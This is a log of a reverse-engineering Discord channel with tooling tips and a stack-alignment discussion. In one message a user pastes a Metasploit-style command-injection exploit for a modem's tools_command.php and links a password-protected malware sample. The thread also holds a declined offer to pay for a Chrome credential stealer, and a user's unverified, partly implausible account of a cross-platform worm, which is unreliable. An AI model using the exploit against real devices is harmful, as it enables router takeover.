# December 2024 - Week 2
# Channel: #reverse-engineering
# Messages: 231

[2024-12-02 12:52] Horsie: Any quick way to find which file in my C:\windows folder has said `symbol`?

[2024-12-02 13:10] diversenok: As in, exports a certain function?

[2024-12-02 13:13] diversenok: You can quickly search for a pattern or a function in a bunch of files with a yara rule

[2024-12-02 13:13] diversenok: ```yara
import "pe"

rule exports
{
    condition:
        pe.exports("MyFunctionName")
}
```

[2024-12-02 13:13] diversenok: ```yara
rule pattern
{
    strings:
        $pattern = "MyPatternString" ascii wide nocase
    
    condition:
        $pattern
}
```

[2024-12-02 13:16] diversenok: Just do `yara.exe -r rule.yara C:\Windows` to do recursive search for files matching a given rule

[2024-12-02 13:16] diversenok: https://virustotal.github.io/yara/

[2024-12-02 13:29] Horsie: [replying to diversenok: "As in, exports a certain function?"]
Ooh. Good idea

[2024-12-02 13:29] Horsie: I'll try this (re: yara)

[2024-12-02 13:30] Horsie: I actually don't think it's an export but there's a chance that it is.

[2024-12-02 13:30] Horsie: If that fails I'll probably have to find a way to search pdbs which seems like an annoying thing to do

[2024-12-02 13:44] diversenok: If you tell the name of the symbol, I might be able to find it

[2024-12-02 13:47] Horsie: [replying to diversenok: "If you tell the name of the symbol, I might be abl..."]
`ComputeNetlogonCredential`

[2024-12-02 13:47] Horsie: I don't know if the symbol name is a lie. But it's in the Secura and CrowdStrike writups for the Zerologon bug.

[2024-12-02 13:49] Horsie: I found the (deeper?) function called NlComputeCredential which does what they claim `ComputeNetlogonCredential` does

[2024-12-02 13:49] diversenok: [replying to Horsie: "`ComputeNetlogonCredential`"]
No matches on Win 11 22H2 pdbs

[2024-12-02 13:49] Horsie: [replying to Horsie: "I found the (deeper?) function called NlComputeCre..."]
(In netlogon.dll)

[2024-12-02 13:49] Horsie: [replying to diversenok: "No matches on Win 11 22H2 pdbs"]
Thanks for looking ❤️

[2024-12-02 13:51] diversenok: [replying to Horsie: "I found the (deeper?) function called NlComputeCre..."]
Yeah, this one is in netlogon.pdb and netjoin.pdb

[2024-12-02 13:51] Horsie: Hmm.. Dont know, what's up with this tbh.

[2024-12-02 13:51] Horsie: Would AV vendors release anti-pastes like this?

[2024-12-02 13:52] Horsie: Seems very unlikely

[2024-12-02 13:54] diversenok: Maybe `ComputeNetlogonCredential` is referring to something from here? https://github.com/search?q=ComputeNetlogonCredential&type=code

[2024-12-02 13:55] diversenok: There are some 3-rd party libraries

[2024-12-02 13:55] diversenok: Also there is a chance it's not in public symbols

[2024-12-02 16:11] daax: [replying to Horsie: "Any quick way to find which file in my C:\windows ..."]
ripgrep

[2024-12-02 16:12] daax: can do pattern matching like any other tool, i use it often to find byte sequences whether insts or strings in bins across dozens of directories

[2024-12-02 16:21] Brit: +++

[2024-12-02 16:21] Brit: insanely fast too

[2024-12-02 16:21] Deleted User: +++++++

[2024-12-02 16:32] Deleted User: is there anyway to connect ida on kdnet session in windbg , its possible on com connection but i really cant find the string sconnection related to the network thing + is there anyway to modify the bp on windbg , its max is 32 and i wanna it to be far more than that cause i cant find good coverage tool for windows kernel , so thoughts pls ?

[2024-12-02 16:33] zeropio: [replying to Deleted User: "is there anyway to connect ida on kdnet session in..."]
try https://github.com/bootleg/ret-sync

[2024-12-02 16:50] Horsie: [replying to daax: "ripgrep"]
I tried it for a second. I can never get it to work it for binaries

[2024-12-02 16:51] Horsie: Which flags do you use?

[2024-12-02 16:53] daax: [replying to Horsie: "Which flags do you use?"]
`rg -uuu (?-u:\x90\x90\x90\x90\x90\x90\x90\x[etc])`

[2024-12-02 16:54] daax: `?-u` disables unicode so you can search for raw byte(s)

[2024-12-02 16:54] Horsie: Aah..

[2024-12-02 16:54] Horsie: Thanks!! 👍

[2024-12-02 16:56] pinefin: [replying to daax: "`rg -uuu (?-u:\x90\x90\x90\x90\x90\x90\x90\x[etc])..."]
i didnt know it could do this

[2024-12-02 16:56] pinefin: thats neat

[2024-12-03 16:16] mrexodia: [replying to daax: "`rg -uuu (?-u:\x90\x90\x90\x90\x90\x90\x90\x[etc])..."]
You can also do `rg --binary`, had success with that in the past

[2024-12-03 17:16] toomuchmoney: anyone here with chromium experience?

[2024-12-03 17:35] 0xdeluks: [replying to toomuchmoney: "anyone here with chromium experience?"]
https://dontasktoask.com/
[Embed: Don't ask to ask, just ask]

[2024-12-03 17:36] toomuchmoney: [replying to 0xdeluks: "https://dontasktoask.com/"]
no

[2024-12-03 17:36] toomuchmoney: im asking

[2024-12-03 17:36] toomuchmoney: to find people with experience specifically

[2024-12-03 17:42] jvoisin: Still qualifies for https://dontasktoask.com/
[Embed: Don't ask to ask, just ask]

[2024-12-03 17:43] jvoisin: And if not, then it's an https://en.wikipedia.org/wiki/XY_problem instance
[Embed: XY problem]
The XY problem is a communication problem encountered in help desk, technical support, software engineering, or customer service situations where the question is about an end user's attempted solution

[2024-12-03 17:58] dullard: [replying to toomuchmoney: "anyone here with chromium experience?"]
nobody, no

[2024-12-03 17:59] 0xdeluks: hello dullard

[2024-12-03 18:01] dullard: hello deluks

[2024-12-03 18:07] 0xdeluks: how u doin? doing good?

[2024-12-03 18:18] dullard: <a:SkypeNod:395314893818953728>

[2024-12-03 23:47] toomuchmoney: anyone with chromium and reversing experience who wants to make $25K 💸

[2024-12-03 23:57] toomuchmoney: exactly boss 💪

[2024-12-04 01:00] Humza: [replying to toomuchmoney: "anyone with chromium and reversing experience who ..."]
wot

[2024-12-04 01:56] Deleted User: does people enjoying ghidra even exist?

[2024-12-04 02:21] emma: [replying to Deleted User: "does people enjoying ghidra even exist?"]
I like ghidra

[2024-12-04 03:45] rin: [replying to Deleted User: "does people enjoying ghidra even exist?"]
Whats wrong with ghidra

[2024-12-04 05:33] emma: ghidra is good for supporting a lot of architecture

[2024-12-04 13:21] 0x208D9: [replying to Deleted User: "does people enjoying ghidra even exist?"]
add cstyle structs to it with a better looking UI and im switching over (just rewrite it in cpp pls)

[2024-12-04 13:40] lucabtz: [replying to 0x208D9: "add cstyle structs to it with a better looking UI ..."]
the UI being ugly looks kinda cool in someway

[2024-12-04 14:27] 0x208D9: [replying to lucabtz: "the UI being ugly looks kinda cool in someway"]
cool till u dont have to actually analyze the program and make sense out of the psuedocode

[2024-12-04 14:33] lucabtz: [replying to 0x208D9: "cool till u dont have to actually analyze the prog..."]
honestly ive only used ghidra so idk if it is way easier with other tools

[2024-12-04 14:33] lucabtz: but it isnt so terrible

[2024-12-04 15:16] 0x208D9: [replying to lucabtz: "honestly ive only used ghidra so idk if it is way ..."]
idk the text is almost unreadable for me specially in the decompiler on the code browser

[2024-12-04 15:18] lucabtz: [replying to 0x208D9: "idk the text is almost unreadable for me specially..."]
oh i see, because of the color scheme or font?

[2024-12-04 15:18] estrellas: i used rattle's theme when messing with ghidra, turned out pretty ok

[2024-12-04 15:19] estrellas: https://github.com/huettenhain/ghidradark

[2024-12-04 15:20] toomuchmoney: [replying to Humza: "wot"]
cool hacking

[2024-12-04 15:23] daax: [replying to Deleted User: "does people enjoying ghidra even exist?"]
imo ghidra is good enough, esp for embedded architectures. there’s also not any issues with licensing and all that crap if you need to use it on premise for work projects. i use it occasionally when i don’t have access to ida/binja

[2024-12-04 15:25] toomuchmoney: hackas

[2024-12-04 15:25] toomuchmoney: who wants a job

[2024-12-04 15:25] toomuchmoney: 💸

[2024-12-04 15:26] daax: [replying to toomuchmoney: "who wants a job"]
nobody wants to do your chrome stealer moron. you can find them open-source on GitHub and get it done for free, or resolve the skill issue and do it yourself. “itaintcheaptobeaboss” — cringe.

[2024-12-04 15:28] Humza: [replying to daax: "nobody wants to do your chrome stealer moron. you ..."]
He wants us to reverse engineer a shitty stealer?

[2024-12-04 15:28] Humza: For him

[2024-12-04 15:28] daax: [replying to Humza: "He wants us to reverse engineer a shitty stealer?"]
No, make one.

[2024-12-04 15:29] Humza: Ngl idk about anyone here but I wouldn’t ever trust some dude on discord with $25k 😭😭😭😭

[2024-12-04 15:30] Humza: If he’s got $25k lying around the only way he can prove it is by buying us all lunch

[2024-12-04 15:31] daax: [replying to Humza: "Ngl idk about anyone here but I wouldn’t ever trus..."]
yeah, typical kid who made money from some questionable endeavors wants to toss it around so he can steal credentials/details probably in some YT RAT and make another bag. HF user behavior.

[2024-12-04 15:31] Humza: [replying to daax: "yeah, typical kid who made money from some questio..."]
Usual kid who thinks they’re rich but their moneys in a cryptocurrency and they aren’t able to spend it on anything useful?

[2024-12-04 15:35] daax: [replying to Humza: "Usual kid who thinks they’re rich but their moneys..."]
who knows lol. not worth it to potentially get nipped as complicit in identity theft/cc fraud.

[2024-12-04 15:41] Humza: Fr fr

[2024-12-04 16:01] idkhidden: 
[Attachments: image0.png]

[2024-12-04 16:20] Analyze: LOL

[2024-12-04 17:02] pinefin: [replying to idkhidden: ""]
REVERSE ENGINEER 😈 
CYBER SECURITY ENTHUSIAST 😈

[2024-12-04 17:03] pinefin: get it queen

[2024-12-04 19:33] NTLM: I have read in the Microsoft ABI docs that after entering a procedure it is expected that the stack address be 16 **byte **aligned (a multiple of 16 bytes)

https://learn.microsoft.com/en-us/cpp/build/stack-usage?view=msvc-170

> The stack will always be maintained 16-byte aligned, except within the prolog (for example, after the return address is pushed), and except where indicated in Function Types for a certain class of frame functions.

In the Intel manual I have also the following sentence under 6.2.2 Stack Alignment 

> The stack pointer for a stack segment should be aligned on 16-**bit **(word) or 32-**bit **(double-word) boundaries,
> depending on the width of the stack segment.

**__I am wondering if this 16/32 bit alignment is referring to something else than what the ABI refers to? Or is it something that is not taken into consideration by most systems?__**

I was thinking if it is referring to the same thing - But `16 bits == 2 bytes` and `32 bits == 4 bytes` while the ABI is referring to a `16 byte` value
[Embed: x64 stack usage]
Learn more about: x64 stack usage

[2024-12-04 19:34] NTLM: 
[Attachments: image.png]

[2024-12-04 22:43] x86matthew: [replying to NTLM: "I have read in the Microsoft ABI docs that after e..."]
yes these are different things, the section in the intel manual refers to the general stack alignment (ie how it should be aligned at all times - 2-byte aligned when the cpu is in 16-bit mode, 4-byte aligned for 32-bit, 8-byte aligned for 64-bit)

[2024-12-04 22:43] x86matthew: you'd have to try pretty hard to mess that up

[2024-12-04 23:08] Deleted User: [replying to daax: "imo ghidra is good enough, esp for embedded archit..."]
cool. I didn't know it was good for embedded. I only really used IDA for x86 and nothing else.

[2024-12-05 00:56] lucabtz: [replying to x86matthew: "yes these are different things, the section in the..."]
But I'm confused now. The ABI seems to keep the stack 16 bit aligned but in 64 bit mode the manual says you're supposed to keep it aligned to 64 bita

[2024-12-05 03:31] Deleted User: [replying to lucabtz: "But I'm confused now. The ABI seems to keep the st..."]
Don't you mean 16 bytes ?

[2024-12-05 03:50] lucabtz: [replying to Deleted User: "Don't you mean 16 bytes ?"]
Ah I wasn't paying attention to the units your right

[2024-12-05 04:17] Torph: [replying to daax: "nobody wants to do your chrome stealer moron. you ..."]
what's a chrome stealer? like a credential stealer targeting chrome?

[2024-12-05 05:59] James: [replying to lucabtz: "But I'm confused now. The ABI seems to keep the st..."]
Hmmmm why dont u just try it and find out

[2024-12-05 05:59] James: Enter a function, sub 7 bytes to sp

[2024-12-05 06:00] James: Then push [rsp+7]

[2024-12-05 06:00] James: Then return

[2024-12-05 06:00] James: And see what happens

[2024-12-05 06:00] James: Seems the most simple way to go about getting to the bottom of things

[2024-12-05 06:01] James: And u kill two birds with one stone

[2024-12-05 06:01] James: Misaligned pushes and misaligned returns

[2024-12-05 06:01] James: Which are the only instructions that are going to make a difference

[2024-12-05 06:01] James: Unless u use insts that explicitly require alignment

[2024-12-05 06:01] James: But those obviously won’t work with a misaligned stack

[2024-12-05 06:02] James: In my mind the biggest downside to misaligned stack like that is gonna be that u might span two cache lines

[2024-12-05 06:26] lucabtz: [replying to James: "Hmmmm why dont u just try it and find out"]
its okay it is already clear

[2024-12-05 17:40] contificate: [replying to James: "In my mind the biggest downside to misaligned stac..."]
Yeah, this is the primary concern in Intel's Optimization Reference Manual

[2024-12-08 12:43] Kyle Escobar: so i just caught the worm/rootkit (i found it just a virtual machine whth like 1000s of vulnrabilities it tries with a network attack environsts) but turns out ATT confirmed my modem was modified firmware and I didnt  realize at the time till I looked for hours but I caught him sending this as RTF,svg, iframe, and webp on mine browser making a request with this string to tool_commands.php on the modem.

‘’’def beh
    a= rand_text_alpha(8)
    b= rand_text_alpha(8)

    begin
      c= d({
        'uri'    => normalize_uri('/', 'tools_command.php'),
        'vars_post' => {
          'cmb_header'  => '',
          'txt_command' => "echo #{beg_boundary}; #{payload.encoded}; echo #{end_boundary}"
        },
        'method' => 'POST',
        'cookie' => "p=#{Rex::Text.md5('super')}"
      })

      if res && res.code == 200 && res.body.to_s =~ /TOOLS - COMMAND/
        print_good("#{peer} - Command sent successfully")
        if res.body.to_s =~ /#{beg_boundary}(.*)#{end_boundary}/m
          print_status("#{peer} - Command output: #{$1}")
        end
      else
        fail_with(Failure::UnexpectedReply, "#{peer} - Command execution failed")
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end

  def a
    begin
      d({
        'uri'    => normalize_uri('/', 'tools_command.php'),
        'vars_post' => {
         'cmb_header'  => '',
         'txt_command' => "#{payload.encoded}"
        },
        'method' => 'POST',
        'cookie' => "p=#{Rex::Text.md5('super')}"
      }, 3)
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end’’’

[2024-12-08 12:44] Kyle Escobar: its a ATT Arris

[2024-12-08 12:44] Kyle Escobar: i turned it into them yesterday bc ive been trying to re-install os's bc this worm shit has spred from windows -> my macbook --> iphone through sync

[2024-12-08 12:45] Kyle Escobar: both my windows and macbook were full blow rootkitted with EFI changes so i may be fucked there as long as flashing wasnt disabled

[2024-12-08 12:46] Kyle Escobar: ik in the config for my AMD ryzen 5 windows it had micro code shit i saw.

[2024-12-08 12:46] Kyle Escobar: no idea

[2024-12-08 12:48] Kyle Escobar: but i do now have the full files if yall want the entire thing to maybe look at. So it makes sure theres like 24 kb of unallocated space on your partition at the end and put the loader and all its filere. It was simple enough to run it in sanbox and grab the rest it downloads.

https://cdn.discordapp.com/attachments/926478490524586047/1315145613490389075/IMG_2884.jpg?ex=6756584c&is=675506cc&hm=719f13a6d30f301b0dab6790317bf2b051fbd534a5d636b2935a563d25c81044&
[Attachments: IMG_2882.png]

[2024-12-08 12:49] Kyle Escobar: well for my mac it didnt do that. instead it reimaged the whole drive and put everything in containeers disk and ocnfigured them so i cant actually touch it.

https://media.discordapp.net/attachments/926478490524586047/1315141530285244416/IMG_2881.jpg?ex=6756547e&is=675502fe&hm=65a8af00401ebea12b875af9b503a815e30c8b202b67c7b61847c6b0be505659&=&format=webp&width=351&height=468

[2024-12-08 12:51] Kyle Escobar: anyway it makes a "snapshot" or bascally all the files to re-install the worm without changes any of your os files in that partition and the EFI i think is what loads the vm which scans any device for the last 24 unallacted bytes

[2024-12-08 12:51] BWA RBX: If I was rooted I'd just buy a new one

[2024-12-08 12:51] Kyle Escobar: so our entired building got hit

[2024-12-08 12:51] Kyle Escobar: bc theyre all att fiber customers

[2024-12-08 12:51] BWA RBX: Oh are you at an apartment complex

[2024-12-08 12:52] BWA RBX: I've seen a lot of that sort of stuff happening recently

[2024-12-08 12:52] Kyle Escobar: our wifi looks like this rn xD  everyone previous had names but it wipes them
[Attachments: 6A311A11-D50E-4495-BC79-EBB51B0F634A.png]

[2024-12-08 12:52] Kyle Escobar: and it makes it so you cant change or flash the modem xD

[2024-12-08 12:52] BWA RBX: Damn

[2024-12-08 12:52] Kyle Escobar: and the modem acts like a dns proxy to send you malware in windows updates

[2024-12-08 12:53] Kyle Escobar: pretty sure this is state actor maybe?

[2024-12-08 12:53] BWA RBX: I'm not sure but it sounds sophisticated for sure

[2024-12-08 12:53] Kyle Escobar: i live in bigh downtown indianapolis nice apartment so we have like maybe some gov workers living here

[2024-12-08 12:53] Kyle Escobar: idk

[2024-12-08 12:53] Kyle Escobar: so they said fuck it and nuked the whole ATT node

[2024-12-08 12:54] Kyle Escobar: thing is even if i get a new pc, if i miss one thing, it will re-install everything in the environemnt it already knowns it's in super fast from what ive seen

[2024-12-08 12:54] Kyle Escobar: so it took some time to scan and find the model cpu and motherboard i noticed

[2024-12-08 12:55] Kyle Escobar: bc i thought it was just user level and only in the browser with a browser exploit

[2024-12-08 12:55] Kyle Escobar: but it was literally just waiting till scanned everything it could in ur env and the hit them all :/

[2024-12-08 12:58] Kyle Escobar: also i couldnt literally track the traffic once it got into the modem even with my Watchguard router behind it. My PC would send traffic out to sites it saw other devices doing requests to in packet captures as spoofed and the modem knew from it's outside server already with like a seeded number gen maybe which device would be for each request.

[2024-12-08 12:58] Kyle Escobar: so it would handle it xD

[2024-12-08 12:58] Kyle Escobar: was fucking stupd

[2024-12-08 12:59] Kyle Escobar: i could kinda tell bc the nat table was fucked.

[2024-12-08 13:00] Kyle Escobar: nothing had establed connections sessions in nat it was all random timeouts cause the DEST server replies back to the real src

[2024-12-08 13:01] Kyle Escobar: idk i doubt it nation state bc theres no reason but im guessing theres worms like this you can buy as a service or something?

[2024-12-08 13:04] Kyle Escobar: https://cdn.discordapp.com/attachments/926478490524586047/1315179875497152512/EC144199-6927-468C-A96F-A2E656ADDC77.jpg?ex=67567835&is=675526b5&hm=ec9fe40df20480b093e78a1f43e9a20fe59e570667c24559d9a7d44052a4ced2& lmao yeh this is the windows one. That lil bit is on any driuve that is infected. any bc it will use the dns server to give you a patched version of popular binaries when you download, it will spread to every exe and also every IMAGE/GIF it find on your pc, account, everything

[2024-12-08 13:05] Kyle Escobar: oh yeh theyre spoofing the CA' signer's domain on the cert they re-sign the patched binaries with so when your infected they look completely fine.

[2024-12-08 13:06] Kyle Escobar: that confused me for a few trying to understand how they could be patching exe on disk without shit tons of errors

[2024-12-08 13:06] BWA RBX: They're definitely harvesting your information, do you have any idea why the government are trying to get information on you?

[2024-12-08 13:06] Kyle Escobar: yeh, they havnt dont shit. i mean i appreciate them not breaking more shit on my system tbh ❤️

[2024-12-08 13:07] Kyle Escobar: anyway im sure yall are interested in the exploints contained?

[2024-12-08 13:07] Kyle Escobar: theres was 240 unique exploits contained just for the mac one

[2024-12-08 13:08] Kyle Escobar: for windows it was fucking like 3GB xD

[2024-12-08 13:08] BWA RBX: I think you should keep the exploits and sell them, or maybe the government want you to do just that so they can use you as a scapegoat

[2024-12-08 13:09] BWA RBX: Did you reverse engineer any of these?

[2024-12-08 13:09] BWA RBX: Just be careful they aren't reading your conversation right now

[2024-12-08 13:09] Kyle Escobar: i made my pc's FQDN stop-or-i.will-leak-ur.rat and they reset it in like a day

[2024-12-08 13:09] Kyle Escobar: ¯\_(ツ)_/¯

[2024-12-08 13:10] BWA RBX: Damn

[2024-12-08 13:10] Kyle Escobar: so no avs detect it. ran huntress, and bunch of EDRs

[2024-12-08 13:10] BWA RBX: Anyways I'm going to watch a movie peace

[2024-12-08 13:10] Kyle Escobar: they are maybe disabling them idk. there wasnt errors

[2024-12-08 14:06] Torph: [replying to Kyle Escobar: "i turned it into them yesterday bc ive been trying..."]
wow, a single program going across multiple OSes? never heard of them storing themselves in unallocated drive space either

[2024-12-08 14:15] Analyze: [replying to Kyle Escobar: "https://cdn.discordapp.com/attachments/92647849052..."]
Clean your monitor bro

[2024-12-08 14:18] cmpzx: [replying to Kyle Escobar: "https://cdn.discordapp.com/attachments/92647849052..."]
Clean your monitor bro....

[2024-12-08 14:49] Kyle Escobar: lmao literally just did after that photo cause i turned lights xD

[2024-12-08 14:49] Kyle Escobar: https://drive.google.com/file/d/1Gy7oyCXbnVzFBuywNeRQkZUZ5whgXg3m/view?usp=drive_link
[Embed: Windows Fresh Media ISO Post Run.7z]

[2024-12-08 14:49] Kyle Escobar: also pw is `plz_no_nsa`

[2024-12-08 14:50] Kyle Escobar: [replying to Torph: "wow, a single program going across multiple OSes? ..."]
its def not single

[2024-12-08 14:54] Kyle Escobar: its for sure a suite of shit off a server cause it downloads like bundles of things it finds it will maybe need by scann afaik. but it exploits browser mostly to do the initial footholds. Also it makes 2 veth adapters that are link-local but one has dns server running, other has various othe rshit listening.. They dns spoof like google and traffic goes to that interface b4 it forwards it on to proper google.

[2024-12-08 14:56] Torph: [replying to Kyle Escobar: "https://drive.google.com/file/d/1Gy7oyCXbnVzFBuywN..."]
is this a dump of an infected system?

[2024-12-08 14:56] Kyle Escobar: its after it extract from a fresh windows media iso install

[2024-12-08 14:56] Kyle Escobar: i put it in sandbox. also i have the original files there

[2024-12-08 14:56] Kyle Escobar: the original one are named ._<name>

[2024-12-08 14:56] Kyle Escobar: so you can diff

[2024-12-08 14:57] Kyle Escobar: only that named ._<name> if they got patched tho ofc

[2024-12-08 14:57] Kyle Escobar: so not everything was changed. look at the date modified

[2024-12-08 15:00] Kyle Escobar: its fucking impossible to remove if you just dont remove EVERY FUCKING device from the pc. Like i thought i was clean, but then i didnt realize yet they got into the modem too (not my router behind it)

[2024-12-08 15:00] Kyle Escobar: the modem spoofed the dns for my razer and nvidia drivers so instanly when i connect to wifi they auto installed

[2024-12-08 15:00] Torph: wow

[2024-12-08 15:01] Kyle Escobar: they spoof their own CA oif ms root cert so  ms wont freak

[2024-12-08 15:01] Kyle Escobar: but it means when i blocked all DNS on my router besides 1.1.1.1 outbound

[2024-12-08 15:01] jonaslyk: ive dealt with tahat one

[2024-12-08 15:01] Kyle Escobar: my windows just wouldnt work right xD

[2024-12-08 15:02] Torph: so the fake drivers look legit to windows? that's nasty

[2024-12-08 15:02] jonaslyk: thats what hit me

[2024-12-08 15:02] Kyle Escobar: <@1308143182424309770> it blew myh fucking mind. ive never thought about that

[2024-12-08 15:02] Kyle Escobar: i was like wtf they dont check the data just the SN or something?

[2024-12-08 15:02] jonaslyk: it use pxe also

[2024-12-08 15:02] Torph: yeah even secondhand this is the craziest worm I've ever heard of

[2024-12-08 15:02] jonaslyk: if you in netwrk with it

[2024-12-08 15:02] Kyle Escobar: oh i turned off pxe

[2024-12-08 15:02] Torph: pxe?

[2024-12-08 15:02] jonaslyk: igood

[2024-12-08 15:03] Kyle Escobar: lmao i dont like the idea of device booting possible without any auth or me knowing xD

[2024-12-08 15:03] Torph: ny wild guess is private execution environment or something

[2024-12-08 15:03] Kyle Escobar: stupid idea imo, ill just have a kvm lmao

[2024-12-08 15:03] jonaslyk: you need to remove thrd party ca from secure boot

[2024-12-08 15:03] Kyle Escobar: ipkvm

[2024-12-08 15:04] Kyle Escobar: so i flash my bios and it was def calmer for a while till something got installed again from somewhere

[2024-12-08 15:05] Kyle Escobar: probably spoofed dns and i tried being careful but you literally cant ttell its spoofing it bc its the loopback and its so fast to do the 1 request. i need to just verify checksums everydownload

[2024-12-08 15:05] Kyle Escobar: but i think first i need to wipe every device

[2024-12-08 15:07] Kyle Escobar: like i cant image they got into my smart lightbulbs  so  im ignoring thos xD but they def were mass sending traffic to my apple HomePods b4 i said alright enought xD and unplugged them. im not about to try to ask apple for help hardware restting a homepod

[2024-12-08 15:08] Kyle Escobar: <@1308143182424309770> did you see the ATT modem cmd i interncepted

[2024-12-08 15:08] Kyle Escobar: is that a command injection if im understanding.

[2024-12-08 15:09] dullard: oh no is this still going on <:kekw:899071675524591637>

[2024-12-08 15:09] Kyle Escobar: they sent the cmd string into that url as md5

[2024-12-08 15:10] Kyle Escobar: [replying to dullard: "oh no is this still going on <:kekw:89907167552459..."]
it wasnt for a while but smd i wasnt fucking crazy...

[2024-12-08 15:10] Kyle Escobar: it just finally went ape shit and jumped os's and being invasive

[2024-12-08 15:11] dullard: ... <:kekw:899071675524591637>

[2024-12-08 15:12] Kyle Escobar: pretty sure it got to my mac tho bc i was thinking i would make my usb for re-install on it and be fine and they spoofed a tool download. then just scanned and embeeded further from there

[2024-12-08 15:13] Kyle Escobar: lmao 🖕 i dont wanna here it i finally provided my ghost via zip to yall now....  lmao

[2024-12-08 15:14] dullard: you haven't proved anything because no one has actually looked at it yet <:kekw:899071675524591637>

[2024-12-08 15:14] Kyle Escobar: but yeh it aparent hit every att fiber modem at least that ik from my neighbors talking about it. cause they reset everyones config xD

[2024-12-08 15:14] Kyle Escobar: idk if they did it from the att network or not tbh.

[2024-12-08 15:16] Kyle Escobar: im just messing man. im really not trynna prove anything. i mostly want help on seeing how tf this all works or if it's a known/adapted tools out there already.

[2024-12-08 19:36] sync: damn

[2024-12-08 19:36] sync: that worm sounds like years of work

[2024-12-08 19:37] sync: who the fuck would do that

[2024-12-08 19:56] Horsie: [replying to Kyle Escobar: "i live in bigh downtown indianapolis nice apartmen..."]
This seems pretty big.

[2024-12-08 19:56] Horsie: And considering how noisy this is, I'm surprised there's no info on this

[2024-12-08 19:58] Horsie: Also it seems to only target people who type like Jonas <:topkek:904522829616263178>

[2024-12-08 20:04] Horsie: Has to be the most sophisticated attacks I've ever seen if this turns out to be as serious as you say.

[2024-12-08 20:18] Horsie: [replying to jonaslyk: "you need to remove thrd party ca from secure boot"]
Since you had it too, any files you can share?

[2024-12-08 20:18] Horsie: I would love to take a look

[2024-12-08 20:18] jonaslyk: no

[2024-12-08 20:19] jonaslyk: im too busy trying to survive

[2024-12-08 20:19] Horsie: Understandable. You take care 👍

[2024-12-08 20:20] Horsie: <@198670740952711168> did you make any progress?

[2024-12-08 21:17] Cozmoe: Jonnas…. Smh

[2024-12-08 21:18] Cozmoe: I open your discord msg and got blasted by a good ol’ use after free I think on my phone

[2024-12-08 22:25] jonaslyk: my discord msg?